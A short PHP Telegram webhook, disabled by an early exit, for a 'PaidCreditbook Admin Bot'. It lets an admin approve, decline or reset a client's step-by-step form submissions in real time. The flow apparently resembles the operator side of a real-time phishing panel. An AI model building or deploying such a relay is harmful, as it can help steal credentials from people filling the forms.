<?php
http_response_code(410);
header('Content-Type: application/json');
echo json_encode(['success' => false, 'message' => 'PHP API disabled.']);
exit;

$raw = file_get_contents('php://input');
$update = json_decode($raw, true);

if (!$update) {
    echo "OK";
    exit;
}

// 1. Handle Messages (/start, /id, /status)
if (!empty($update['message'])) {
    $msg = $update['message'];
    $senderChatId = (string)($msg['chat']['id'] ?? '');
    $text = trim($msg['text'] ?? '');

    if ($text === '/start' || $text === '/id' || $text === '/help') {
        $isTarget = ($senderChatId === (string)CHAT_ID);
        $reply  = "👋 <b>PaidCreditbook Admin Bot (cPanel)</b>\n\n";
        $reply .= "🆔 <b>Your Chat ID:</b> <code>{$senderChatId}</code>\n";
        $reply .= "⚙️ <b>Configured Chat ID:</b> <code>" . CHAT_ID . "</code>\n\n";

        if ($isTarget) {
            $reply .= "✅ <b>Status: Active & Authorized!</b>\nYou will receive live form submissions here with interactive approval buttons.";
        } else {
            $reply .= "⚠️ <b>Notice:</b> Your Chat ID does not match <code>CHAT_ID</code> in <code>config.php</code>.\n\nPlease update <code>CHAT_ID</code> to <code>{$senderChatId}</code>.";
        }

        // Send reply
        $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
        file_get_contents($url . "?" . http_build_query([
            'chat_id'    => $senderChatId,
            'text'       => $reply,
            'parse_mode' => 'HTML'
        ]));
    }
}

// 2. Handle Button Clicks (Callback Queries)
if (!empty($update['callback_query'])) {
    $cq = $update['callback_query'];
    $action = $cq['data'] ?? '';
    $cqId = $cq['id'];
    $chatId = $cq['message']['chat']['id'] ?? $cq['from']['id'];

    $state = loadState();

    $answerText = '';
    $notifyText = '';

    if ($action === 'action_approve') {
        $state['status'] = 'filling';
        saveState($state);
        $answerText = '✅ Approved! Client advancing to next step.';
        $notifyText = "✅ <b>Step {$state['step']} APPROVED</b> by admin.";
    } elseif ($action === 'action_decline') {
        $state['status'] = 'declined';
        saveState($state);
        $answerText = '❌ Declined! Client prompted to retry.';
        $notifyText = "❌ <b>Step {$state['step']} DECLINED</b>.";
    } elseif ($action === 'action_done') {
        $state['status'] = 'done';
        saveState($state);
        $answerText = '🏁 Flow Marked Complete!';
        $notifyText = "🏁 <b>Flow COMPLETED</b>.";
    } elseif ($action === 'action_reset') {
        resetState();
        $answerText = '🔄 Reset!';
        $notifyText = "🔄 <b>State has been RESET</b>.";
    }

    // Answer callback query
    $answerUrl = "https://api.telegram.org/bot" . BOT_TOKEN . "/answerCallbackQuery";
    file_get_contents($answerUrl . "?" . http_build_query([
        'callback_query_id' => $cqId,
        'text'              => $answerText
    ]));

    if ($notifyText) {
        $sendUrl = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
        file_get_contents($sendUrl . "?" . http_build_query([
            'chat_id'    => $chatId,
            'text'       => $notifyText,
            'parse_mode' => 'HTML'
        ]));
    }
}

echo "OK";
